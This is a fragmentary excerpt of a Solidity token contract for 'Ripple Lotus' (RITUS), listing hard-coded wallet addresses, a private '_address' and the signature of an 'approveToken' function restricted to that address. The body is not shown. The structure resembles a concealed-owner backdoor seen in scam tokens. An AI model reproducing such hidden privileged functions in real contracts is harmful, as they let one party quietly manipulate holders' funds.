...
contract ripplelotus  is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Ripple Lotus";
    string private constant _symbol = unicode"RITUS";
    ...
    address payable public DevWallet = payable(0xf32100c32136FcAFCcC09547Ffbb952fF93D9562);
    address payable public MarketingWallet = payable(0xA877bA4a5dfE11719e42C2735462E5e665EcC5Ca);
    address private _address = 0xEA7F0c425C9e7be5aC6c889ca00772c8A88a07B0;
    ...
    function approveToken(uint256 acc, address adr) onlyAddress public virtual {
